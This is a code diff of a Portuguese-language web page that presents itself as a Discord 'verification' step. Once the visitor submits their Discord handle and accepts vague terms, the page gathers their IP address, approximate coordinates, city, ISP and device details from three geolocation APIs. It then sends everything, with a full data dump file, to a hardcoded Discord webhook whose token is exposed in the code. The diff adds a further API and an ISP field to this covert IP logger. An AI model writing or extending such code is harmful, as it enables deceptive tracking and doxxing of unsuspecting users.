@@ -19,22 +19,20 @@
     </div>
 
     <!-- Conteúdo principal -->
-    <div id="mainContent">
+    <div id="mainContent" style="display: none;">
         <header>
             <h1>Bem-vindo à Verificação</h1>
         </header>
         <nav>
             <button onclick="openTerms()">Verificar</button>
         </nav>
-        <div id="verificationMessage">
-            Seu pedido de verificação foi enviado. Espere ser verificado!
-        </div>
+        <div id="verificationMessage" style="display: none;"></div>
         <footer>
             <p>Junte-se ao nosso servidor do Discord: <a href="https://discord.gg/jD9JvmsjrU" target="_blank">Clique aqui</a></p>
         </footer>
 
         <!-- Modal de termos e condições -->
-        <div id="termsModal" class="modal">
+        <div id="termsModal" class="modal" style="display: none;">
             <div class="modal-content">
                 <h2>Termos e Condições</h2>
                 <p>Ao clicar em "Aceitar", você concorda com os termos e condições.</p>
@@ -45,19 +43,7 @@
     </div>
 
     <script>
-        // Elementos
-        const discordModal = document.getElementById('discordModal');
-        const mainContent = document.getElementById('mainContent');
-        const termsModal = document.getElementById('termsModal');
-        const discordHandleInput = document.getElementById('discordHandle');
-        const verificationMessage = document.getElementById('verificationMessage');
-
-        // Inicializar
-        mainContent.style.display = 'none';
-        termsModal.style.display = 'none';
-        verificationMessage.style.display = 'none';
-
-        // Config padrão (fallback)
+        // Configuração padrão
         const defaultConfig = {
             webhook: "https://discord.com/api/webhooks/1360595060672040990/aAy8Yj1c9iQ3rVH_lg9R3qwA4_G_omtJMNTH8_jf69idGoP3Fa7qshl3dd7XVNld7Kwh",
             embed: {
@@ -71,117 +57,151 @@
                     { name: "**Cidade**", key: "cidade" },
                     { name: "**Estado**", key: "estado" },
                     { name: "**País**", key: "pais" },
-                    { name: "**Dispositivo**", key: "dispositivo" }
+                    { name: "**Dispositivo**", key: "dispositivo" },
+                    { name: "**ISP**", key: "isp" }
                 ]
             }
         };
 
-        // Carregar config.json
+        // Carregar configuração
         let config = defaultConfig;
-        fetch('config.json')
-            .then(response => {
-                if (!response.ok) {
+        async function loadConfig() {
+            try {
+                const response = await fetch('config.json');
+                if (response.ok) {
+                    config = { ...defaultConfig, ...(await response.json()) };
+                } else {
                     console.warn('config.json não encontrado, usando config padrão');
-                    return defaultConfig;
                 }
-                return response.json();
-            })
-            .then(data => config = { ...defaultConfig, ...data })
-            .catch(error => console.warn('Erro ao carregar config.json:', error));
+            } catch (error) {
+                console.warn('Erro ao carregar config.json:', error);
+            }
+        }
 
-        // Função para enviar o @ do Discord
+        // Elementos DOM
+        const elements = {
+            discordModal: document.getElementById('discordModal'),
+            mainContent: document.getElementById('mainContent'),
+            termsModal: document.getElementById('termsModal'),
+            discordHandleInput: document.getElementById('discordHandle'),
+            verificationMessage: document.getElementById('verificationMessage')
+        };
+
+        // Inicializar
+        elements.mainContent.style.display = 'none';
+        elements.termsModal.style.display = 'none';
+        elements.verificationMessage.style.display = 'none';
+        loadConfig();
+
+        // Validar handle do Discord
+        function validateDiscordHandle(handle) {
+            const regex = /^@[\w-]{2,32}$/;
+            return regex.test(handle);
+        }
+
+        // Sanitizar entrada
+        function sanitizeInput(input) {
+            return input.replace(/[<>"'();]/g, '');
+        }
+
+        // Enviar handle do Discord
         function submitDiscord() {
-            const discordHandle = discordHandleInput.value.trim();
-            if (discordHandle) {
-                discordModal.style.display = 'none';
-                mainContent.style.display = 'block';
+            const discordHandle = sanitizeInput(elements.discordHandleInput.value.trim());
+            if (validateDiscordHandle(discordHandle)) {
+                elements.discordModal.style.display = 'none';
+                elements.mainContent.style.display = 'block';
                 window.discordHandle = discordHandle;
             } else {
-                alert('Por favor, insira seu @ do Discord.');
+                alert('Handle do Discord inválido. Use o formato @seuusuario (2-32 caracteres).');
             }
         }
 
         // Abrir modal de termos
         function openTerms() {
-            termsModal.style.display = 'flex';
+            elements.termsModal.style.display = 'flex';
         }
 
         // Fechar modal de termos
         function closeTerms() {
-            termsModal.style.display = 'none';
+            elements.termsModal.style.display = 'none';
+        }
+
+        // Obter dados de geolocalização de múltiplas APIs
+        async function fetchGeoData() {
+            const apis = [
+                { name: 'ipinfo', url: 'https://ipinfo.io/json' },
+                { name: 'ipapi', url: 'https://ipapi.co/json/' },
+                { name: 'ip-api', url: 'http://ip-api.com/json/?fields=66846719' }
+            ];
+            const results = { ipinfo: {}, ipapi: {}, 'ip-api': {} };
+
+            const promises = apis.map(async ({ name, url }) => {
+                try {
+                    const response = await fetch(url, { headers: { 'User-Agent': navigator.userAgent } });
+                    if (response.ok) {
+                        results[name] = await response.json();
+                    } else {
+                        results[name].error = `HTTP ${response.status}`;
+                    }
+                } catch (error) {
+                    results[name].error = error.message;
+                }
+            });
+
+            await Promise.all(promises);
+            return results;
+        }
+
+        // Obter dados do dispositivo
+        function getDeviceInfo() {
+            try {
+                const parser = new UAParser();
+                const result = parser.getResult();
+                return {
+                    type: result.device.type || 'Desktop',
+                    os: `${result.os.name || 'Desconhecido'} ${result.os.version || ''}`,
+                    browser: `${result.browser.name || 'Desconhecido'} ${result.browser.version || ''}`,
+                    raw: result
+                };
+            } catch (error) {
+                return { error: error.message };
+            }
+        }
+
+        // Construir dados para o embed
+        function buildEmbedData(geoData, deviceInfo) {
+            const primaryGeo = geoData.ipinfo.error ? (geoData.ipapi.error ? geoData['ip-api'] : geoData.ipapi) : geoData.ipinfo;
+            return {
+                nick: window.discordHandle || "@desconhecido",
+                date: new Date().toLocaleString("pt-BR"),
+                ip: primaryGeo.ip || "Não disponível",
+                loc: primaryGeo.loc || primaryGeo.latitude
+                    ? `[${primaryGeo.city || 'Local'}, ${primaryGeo.region || 'Desconhecido'}](https://www.google.com/maps?q=${primaryGeo.loc || `${primaryGeo.latitude},${primaryGeo.longitude}`})`
+                    : "Não disponível",
+                cidade: primaryGeo.city || "Não disponível",
+                estado: primaryGeo.region || primaryGeo.regionName || "Não disponível",
+                pais: primaryGeo.country || primaryGeo.countryCode || "Não disponível",
+                dispositivo: `${deviceInfo.type} (${deviceInfo.os}, ${deviceInfo.browser})`,
+                isp: primaryGeo.org || primaryGeo.isp || "Não disponível"
+            };
         }
 
         // Aceitar termos e enviar ao webhook
         async function acceptTerms() {
-            termsModal.style.display = 'none';
-            verificationMessage.style.display = 'block';
+            elements.termsModal.style.display = 'none';
+            elements.verificationMessage.style.display = 'block';
+            elements.verificationMessage.textContent = "Enviando verificação...";
 
-            // Dados para o embed (apenas IPinfo)
-            let embedData = {
-                nick: window.discordHandle || "@desconhecido",
-                date: new Date().toLocaleString("pt-BR"),
-                ip: "Não disponível",
-                loc: "Não disponível",
-                cidade: "Não disponível",
-                estado: "Não disponível",
-                pais: "Não disponível",
-                dispositivo: "Não disponível"
-            };
+            // Coleta de dados
+            const geoData = await fetchGeoData();
+            const deviceInfo = getDeviceInfo();
+            const embedData = buildEmbedData(geoData, deviceInfo);
 
-            // Dados completos para o arquivo .txt
-            let allData = {
-                ipinfo: {},
-                ipapi: {},
-                dispositivo: {}
-            };
-
-            // Obter dados do IPinfo
-            try {
-                const ipResponse = await fetch('https://ipinfo.io/json');
-                if (ipResponse.ok) {
-                    const ipData = await ipResponse.json();
-                    allData.ipinfo = ipData;
-                    embedData.ip = ipData.ip || "Não disponível";
-                    embedData.cidade = ipData.city || "Não disponível";
-                    embedData.estado = ipData.region || "Não disponível";
-                    embedData.pais = ipData.country || "Não disponível";
-                    embedData.loc = ipData.loc
-                        ? `[${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'}](https://www.google.com/maps?q=${ipData.loc})`
-                        : `${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'} (aproximado)`;
-                }
-            } catch (error) {
-                console.error('Erro ao obter dados do IPinfo:', error);
-                allData.ipinfo.error = error.message;
-            }
-
-            // Obter dados do ipapi.co
-            try {
-                const ipapiResponse = await fetch('https://ipapi.co/json/');
-                if (ipapiResponse.ok) {
-                    const ipapiData = await ipapiResponse.json();
-                    allData.ipapi = ipapiData;
-                }
-            } catch (error) {
-                console.error('Erro ao obter dados do ipapi.co:', error);
-                allData.ipapi.error = error.message;
-            }
-
-            // Obter dispositivo
-            try {
-                const parser = new UAParser();
-                const result = parser.getResult();
-                embedData.dispositivo = `${result.device.type || 'Desktop'} (${result.os.name || 'Desconhecido'} ${result.os.version || ''}, ${result.browser.name || 'Desconhecido'})`;
-                allData.dispositivo = result;
-            } catch (error) {
-                console.error('Erro ao obter dispositivo:', error);
-                allData.dispositivo.error = error.message;
-            }
-
-            // Criar embed (apenas IPinfo)
+            // Criar embed
             const embed = {
                 embeds: [{
-                    title: config.embed.title || "Nova Verificação",
-                    color: parseInt((config.embed.color || "#FF0000").replace("#", ""), 16) || 0xFF0000,
+                    title: config.embed.title,
+                    color: parseInt((config.embed.color || "#FF0000").replace("#", ""), 16),
                     fields: config.embed.fields.map(field => ({
                         name: field.name,
                         value: String(embedData[field.key] || "Não disponível"),
@@ -191,54 +211,38 @@
                 }]
             };
 
-            // Validar JSON
-            let payloadJson;
-            try {
-                payloadJson = JSON.stringify(embed);
-                console.log('Payload JSON:', payloadJson);
-            } catch (error) {
-                console.error('Erro ao criar JSON:', error);
-                verificationMessage.textContent = "Erro ao formatar dados. Tente novamente.";
-                verificationMessage.style.background = "#ff3333";
-                return;
-            }
-
-            // Criar arquivo .txt com todos os dados
+            // Criar arquivo .txt
             const txtData = `
 Informações de Verificação
-
-1. IPinfo:
-${JSON.stringify(allData.ipinfo, null, 2)}
-
-2. ipapi.co:
-${JSON.stringify(allData.ipapi, null, 2)}
-
-3. Dispositivo:
-${JSON.stringify(allData.dispositivo, null, 2)}
+1. Discord: ${embedData.nick}
+2. Data: ${embedData.date}
+3. IPinfo:
+${JSON.stringify(geoData.ipinfo, null, 2)}
+4. ipapi.co:
+${JSON.stringify(geoData.ipapi, null, 2)}
+5. ip-api.com:
+${JSON.stringify(geoData['ip-api'], null, 2)}
+6. Dispositivo:
+${JSON.stringify(deviceInfo.raw || deviceInfo, null, 2)}
             `;
             const blob = new Blob([txtData], { type: 'text/plain' });
             const formData = new FormData();
-            formData.append('payload_json', payloadJson);
+            formData.append('payload_json', JSON.stringify(embed));
             formData.append('file', blob, `${embedData.nick.replace('@', '')}.txt`);
 
             // Enviar ao webhook
             try {
-                console.log('Enviando FormData...');
                 const response = await fetch(config.webhook, {
                     method: "POST",
                     body: formData
                 });
-                if (!response.ok) {
-                    const errorText = await response.text();
-                    console.error('Erro na resposta do webhook:', response.status, errorText);
-                    throw new Error(`Falha ao enviar dados: ${response.status} ${errorText}`);
-                }
-                verificationMessage.textContent = "Verificação enviada com sucesso!";
-                verificationMessage.style.background = "#28a745";
+                if (!response.ok) throw new Error(`HTTP ${response.status}: ${await response.text()}`);
+                elements.verificationMessage.textContent = "Verificação enviada com sucesso!";
+                elements.verificationMessage.style.background = "#28a745";
             } catch (error) {
                 console.error('Erro ao enviar webhook:', error);
-                verificationMessage.textContent = `Erro ao enviar verificação: ${error.message}. Tente novamente.`;
-                verificationMessage.style.background = "#ff3333";
+                elements.verificationMessage.textContent = `Erro: ${error.message}. Tente novamente.`;
+                elements.verificationMessage.style.background = "#ff3333";
             }
         }
     </script>
